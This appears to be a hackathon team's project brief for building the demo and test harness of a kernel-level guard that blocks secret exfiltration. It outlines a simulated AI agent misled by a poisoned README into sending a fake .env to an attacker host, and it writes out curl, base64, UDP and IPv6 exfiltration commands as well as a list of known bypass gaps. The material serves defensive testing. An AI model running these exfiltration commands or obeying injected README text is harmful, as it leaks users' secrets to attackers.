# Suyash: Track D, demo and verification (`demo/`, `scripts/`, `tests/`) + Track P, presentation

This file covers `demo/`, plus the top-level `scripts/` and `tests/` folders. Your policy notes are in [policy/docs/suyash.md](../../policy/docs/suyash.md).

## 1. Your part, in plain words

Think of the server as an office building and every running program as a person inside it. SyscallGuard is a guard at the exit doors: anyone who touched a confidential file gets a stamp on their hand, and a stamped person may only go to approved rooms.

You build the **stage and the proof**. The stage: a fake AI agent that reads `.env` and then "follows" a poisoned README, a friendly internal API it's allowed to talk to, and an attacker outside the building waiting to receive secrets. The proof: scripts that check the VM is ready, and an attack matrix that tries every escape route we claim to block and confirms the kernel refused each one with `EPERM`, while the attacker received zero bytes. You also own the runbook that makes the two-minute demo work every time.

You also wear the Track P (presentation) hat: five people, five tracks, and the runbook is already yours. If someone is genuinely free later, P can be reassigned.

## 2. Where it sits

```
 HOST LAPTOP (Fedora)                         VM (Fedora, BPF LSM)  ← the protected server
 ┌──────────────────────────┐                ┌─────────────────────────────────────────┐
 │ Electron dashboard ──────┼── ws:8765 ───▶ │ bridge.py  ◀── stdin ── guard.py (root) │
 │ attacker.py :9999 ◀──────┼── ✖ blocked ── │ agent.py ──▶ internal_api.py :8080 (ok) │
 │ terminal (ssh into VM)   │                │ kernel: hooks A–E + maps + ring buffer  │
 └──────────────────────────┘                └─────────────────────────────────────────┘
        attacker reachable from the VM at the libvirt gateway (usually 192.168.122.1)
```

Your files: `attacker.py` (host), `agent.py`, `internal_api.py`, `reset.sh`, `project/` (VM), plus `scripts/` and `tests/`.

## 3. Files you own

- `demo/agent.py`: simulated AI agent
- `demo/internal_api.py`: allowlisted internal API mock
- `demo/attacker.py`: attacker listener (host laptop)
- `demo/reset.sh`: reset between runs
- `demo/project/.env`: FAKE secrets (complete)
- `demo/project/README.md`: poisoned README, text only (complete)
- `scripts/check_env.sh`: M0 checks (complete)
- `scripts/lsm_smoke_test.py`: M0 LSM load check (complete)
- `tests/attack_matrix.py`: privileged end-to-end matrix
- `docs/presentation/`: Track P, all of it (`demo-runbook.md`, `talk-track.md`, `judge-qa.md`), plus the deck and poster
- `policy/policy.example.toml`: keeping it correct for the VM (Hifza owns the schema)
- `demo/docs/suyash.md`: this file (sections 6, 9, 10 only, during development)

Do not edit: `tests/test_policy.py` (Hifza), `tests/test_events.py` (Divyanshu), `guard/` (Azaan, Hifza, Divyanshu), `bridge/` (Divyanshu), `dashboard/` (Devansh).

## 4. What to build

All demo/test tools: Python 3 stdlib only (plus `curl`/`nc` where noted).

**`demo/agent.py --mode MODE [--env PATH] [--attacker HOST] [--port 9999] [--api http://127.0.0.1:8080]`**

`--attacker` defaults to the default-route gateway (the libvirt host, usually 192.168.122.1) and must not be loopback. One mode per run, then it exits.

1. Reads `.env`, which gets it tagged.
2. POSTs to `--api` + `/query`. Allowed; prints the status.
3. "Follows the README": attempts exfil per `MODE`:
   - `direct`: Python TCP connect + send
   - `curl`: `subprocess` runs `curl -sS --data-binary @.env` (tests inheritance)
   - `b64`: base64 then direct
   - `ipv6`: IPv4-mapped IPv6 (`::ffff:<attacker>`), checked as IPv4 by hook B
   - `udp`: `sendto`. **NOT BLOCKED until hook C lands** (hook C, `socket_sendmsg`, is not in the kernel yet)
   - `preconnect`: connect to the target *before* reading `.env`, then send. **NOT BLOCKED until hook C lands** (hook C, `socket_sendmsg`, is not in the kernel yet)
4. Prints `BLOCKED by the guard: [errno 1] ...` only on `EPERM`; any other error is reported as "no guard involved".

For `curl` mode the EPERM lands in the child: the agent prints `BLOCKED by the guard (curl: Operation not permitted)` when curl's stderr says so. curl exit `7` without that text means connection refused, not a block, so `attack_matrix.py` confirms curl blocks from the guard's `BLOCK` event.

**`demo/internal_api.py --port 8080`**: stdlib HTTP server on `127.0.0.1`. `POST /query` returns 200 JSON; `GET /health` for a liveness check. Logs one line per request.

**`demo/attacker.py --port 9999`**: runs on the **host laptop**. TCP + UDP listener on `0.0.0.0`. Prints a timestamped `TCP got n bytes from ...` / `UDP got n bytes from ...` line with the payload when anything arrives.

**`demo/reset.sh`**: kills leftover `agent.py` / `curl`, restarts `internal_api.py` (log `/tmp/internal_api.log`), checks the hooks are still loaded (`sudo -n`, never prompts). Leaves the guard | bridge pipeline, attacker and dashboard running.

**`demo/project/.env`**: obviously fake values that don't look like real key formats (e.g. `DB_PASSWORD=demo-password-not-real`, `PAYMENT_API_KEY=DEMO-KEY-0000-FAKE`). No real-looking prefixes (`sk-`, `AKIA`, `ghp_`) so push protection isn't triggered.

**`tests/attack_matrix.py --target HOST:PORT`** (root, VM only): one case per "Blocked" row below, plus two controls:

- untagged process reaches the attacker (proves it's not a firewall);
- tagged process reaches an allowlisted address (127.0.0.1:8080).

Check for `EPERM` specifically, not just "failed". A timeout or connection refused is a **fail**, not a pass. Afterwards, the attacker log must show 0 bytes.

| Attempt | Mechanism |
|---|---|
| Tagged process connects to a non-allowlisted IP | Hook B |
| `curl -d @.env attacker` (curl opens the file itself) | Hook A tags curl, then Hook B |
| Tagged process spawns `curl` / `nc` / `python` carrying the data | Hook D inheritance, then Hook B/C |
| Base64 / any encoding | Content is never inspected; the process is tagged |
| Any port (matrix tries 9999 and 4444) | Allowlist is by address |
| IPv4-mapped IPv6 (`::ffff:192.168.122.1`) | Hooks B/C |
| UDP `sendto()` | Hook C. **NOT BLOCKED until hook C lands** (hook C, `socket_sendmsg`, is not in the kernel yet) |
| Socket connected *before* reading the secret, then `send()` | Hook C checks the connected peer. **NOT BLOCKED until hook C lands** (hook C, `socket_sendmsg`, is not in the kernel yet) |

Nothing needs to listen on 4444: a block is `EPERM` before any packet leaves, and anything else (refused, timeout) is a fail. Native IPv6 is not in the matrix (dropped 18 Oct: the libvirt network may have no IPv6 routing, not worth a day). IPv4-mapped IPv6 rides IPv4 routing, so it stays.

Never add a known-gap row (pipes, file relays, allowlisted exfil, DNS tunnelling, AF_UNIX, ptrace, root, leader-exit) as "blocked".

## 5. Contract excerpts

Contract excerpt (source of truth: ARCHITECTURE.md, section "Contract 3: Guard CLI and JSON event schema"):

```
sudo python3 guard/guard.py -p policy/policy.toml [--mode audit|enforce] [--debug]
```

Contract excerpt (source of truth: ARCHITECTURE.md, section "Contract 4: Bridge WebSocket protocol"):

```
sudo python3 guard/guard.py -p policy/policy.toml | python3 bridge/bridge.py --host 0.0.0.0 --port 8765
python3 bridge/bridge.py --fake --port 8765        # no kernel, any OS
```

Contract excerpt (source of truth: ARCHITECTURE.md, section "Process model"):

> Firewall: on the host, `sudo firewall-cmd --zone=libvirt --add-port=9999/tcp --add-port=9999/udp`; in the VM, `sudo firewall-cmd --add-port=8765/tcp`.

## 6. Your milestones

- [ ] **M0 Env** (D, everyone runs, 18 Oct): `scripts/check_env.sh` all PASS; `sudo python3 scripts/lsm_smoke_test.py` exits 0
- [ ] **M6 Attack matrix** (D, 20 Oct): `sudo python3 tests/attack_matrix.py --target 192.168.122.1:9999` passes every "Blocked" row in Part 2, plus the untagged-allowed and allowlisted-allowed controls; checks `EPERM` specifically (not just "failed"); attacker log shows 0 bytes
- [ ] **M7 Freeze** (all, P leads, 21 Oct): VM snapshot saved; backup video recorded; runbook complete; 3 consecutive cold runs pass

**Start now:** `internal_api.py`, `attacker.py`, `agent.py` (all runnable without the guard), `reset.sh`, VM networking and firewall. Get every teammate through M0 today.
**Blocked by:** Azaan + Hifza for M3/M4 (agent modes only show `BLOCK` once hooks exist); all of K/G for M6.
**You block:** M3 and M4 acceptance (they use your `agent.py`), M7 for everyone.

## 7. How to run and test your part

```bash
# M0, inside the VM
scripts/check_env.sh                       # every line PASS, exit 0
sudo python3 scripts/lsm_smoke_test.py     # 5 trace lines, "OK: BPF LSM works.", exit 0

# Without the guard (any Linux box): everything should SUCCEED
python3 demo/internal_api.py --port 8080 &
python3 demo/attacker.py --port 9999 &
python3 demo/agent.py --mode direct --env demo/project/.env --port 9999 \
  --attacker "$(hostname -I | cut -d' ' -f1)" --api http://127.0.0.1:8080   # attacker prints TCP got n bytes
# (the agent refuses a loopback attacker: 127.0.0.0/8 is allowlisted)

# Real, VM + host (see runbook below)
sudo python3 tests/attack_matrix.py --target 192.168.122.1:9999
```

| If this happens | Check |
|---|---|
| `check_env.sh` FAIL on kernel-devel | `sudo dnf install kernel-devel-$(uname -r)`; reboot into the newest kernel if versions differ. |
| FAIL on BPF LSM | Kernel cmdline needs `lsm=...,bpf`; check `/sys/kernel/security/lsm`. |
| Agent "succeeds" against attacker in enforce mode | Is the attacker on loopback (allowlisted)? Must be on the host at 192.168.122.1. Is the guard in enforce? Is the protect path the VM's real `.env`? |
| Agent hangs instead of EPERM | A kernel block is instant `EPERM`; a hang means the guard did not block and the host firewall dropped the packet. Check the guard first, then open 9999 on the libvirt zone. A timeout never counts as blocked. |
| Matrix row passes on "connection refused" | Bug in the matrix: check `errno == EPERM` only. |
| Dashboard on host can't connect | VM firewall port 8765; bridge `--host 0.0.0.0`. |
| Attacker shows bytes during the demo | Stop. Something isn't tagged or the target is allowlisted. Switch to the backup video. |

### Two-minute demo runbook (summary; full version goes in `docs/presentation/demo-runbook.md`)

**Before judges arrive** (VM restored from snapshot, everything pre-typed in shell history):

```bash
# host
sudo firewall-cmd --zone=libvirt --add-port=9999/tcp --add-port=9999/udp
python3 demo/attacker.py --port 9999                                   # host terminal 1
cd dashboard && npm start -- --bridge=ws://<vm-ip>:8765 --kiosk        # host terminal 2
# VM (ssh)
sudo firewall-cmd --add-port=8765/tcp
sudo python3 guard/guard.py -p policy/policy.toml --mode enforce | python3 bridge/bridge.py --host 0.0.0.0 --port 8765
demo/reset.sh                                                          # starts internal_api.py
```

**On stage:**

1. Dashboard green "Protected"; point at the policy panel (protected `.env`, allowlist = loopback).
2. Show the poisoned README: `cat demo/project/README.md` (the HTML comment is the injection).
3. Control: an untagged process reaches the attacker. `python3 -c "import socket; socket.create_connection(('192.168.122.1',9999)).sendall(b'hello')"` → attacker prints `TCP got 5 bytes`. "Not a firewall."
4. The attack: `python3 demo/agent.py --mode curl --env demo/project/.env --attacker 192.168.122.1 --port 9999 --api http://127.0.0.1:8080`. It runs straight through: TAG, the allowed POST (ALLOW), curl inherits the tag, `BLOCKED by the guard (curl: Operation not permitted)`, banner red, attacker silent.
5. Close on the rule: read a protected file → only allowlisted destinations, enforced in the kernel.

**Backup video:** you record it; Azaan verifies it.

**Track P duties:** talk track (`docs/presentation/talk-track.md`), judge Q&A upkeep (`docs/presentation/judge-qa.md`), deck, poster/standee, rehearsal schedule.

**Never edit `demo/project/.env` while the guard is running.** An editor save can give the file a new inode and silently end protection. If you do edit it, restart the guard.

**Restarting the guard = restarting the whole pipeline.** This is the normal reset: Ctrl-C the `guard.py | bridge.py` pipeline in the VM, then run it again:

```bash
sudo python3 guard/guard.py -p policy/policy.toml --mode enforce | python3 bridge/bridge.py --host 0.0.0.0 --port 8765
```

The bridge can't reattach to a new guard (its stdin is closed for good), so never restart only `guard.py`. The dashboard reconnects on its own within ~2 s and shows guard feeding again.

**Between runs:** `demo/reset.sh`. For a cold run, revert the VM snapshot.

**Judges** may try only: `--mode direct`, `--mode curl`, `--mode b64`, and other ports (`--port 4444`). Never `udp` or `preconnect` until hook C has landed (they are not blocked), never native IPv6 (not set up). **Never invite pipes** (`cat .env | curl ...`): that's a known gap.

**If something fails on stage:** Electron dies → open `dashboard/renderer/index.html?bridge=ws://<vm-ip>:8765` in a browser. Guard won't load or VM networking breaks → play the backup video. Attacker receives bytes → stop the live demo, say so plainly, switch to the video.

## 8. Working with AI agents

Safety rules that apply here (from AGENTS.md):

- Default `mode` is `audit`. Use `enforce` only inside the VM.
- `sudo` is only for `guard.py`, `lsm_smoke_test.py` and `attack_matrix.py`.
- Never commit real secrets. `demo/project/.env` holds obviously fake values only.
- Never claim to block a known gap.

Conventions: Python 3 stdlib only; `argparse`; scripts runnable from the repo root. Messages short and loud enough to read on stage.

Common pitfalls: attacker on localhost (allowlisted, so never blocked); counting timeouts as blocks; real-looking keys in `.env`; runbook commands that drift from the actual CLI flags.

Commit format: `feat(demo): M3 agent exfil modes`, `test(demo): M6 attack matrix`, `docs(demo): M7 runbook`.

Start-here prompt to paste to an agent:

> I'm Suyash, Track D. Read AGENTS.md, docs/shared.md, demo/docs/suyash.md and ARCHITECTURE.md. Work only in demo/, scripts/ and tests/ (and the demo runbook). Stdlib only. Implement the next unticked item in section 6. Never mark a known gap as blocked; check EPERM specifically. Don't run sudo; give me the VM commands. At the end, update only sections 6, 9 and 10 of my file.

## 9. Open questions

None open. Resolved 18 Oct (see docs/shared.md): `tests/test_policy.py` is Hifza's; curl mode uses exit code 7; native IPv6 dropped; ports 9999 and 4444; `policy/policy.toml` is gitignored; you record the backup video, Azaan verifies; Track P is your second hat.

## 10. Work log

- 2026-10-18: file created. `.env`, poisoned README, `check_env.sh`, `lsm_smoke_test.py` complete from bootstrap; the rest are stubs.
- 2026-10-18: docs updated with team decisions (TAG_INHERIT name not asserted, hook C emits no ALLOW, native IPv6 dropped, open questions resolved). See docs/shared.md.
- 2026-10-18: runbook rule: never edit .env while the guard runs; test_events.py is Divyanshu's (see docs/shared.md).
- 2026-10-18: runbook: restarting the guard means restarting the whole guard | bridge pipeline (see docs/shared.md).
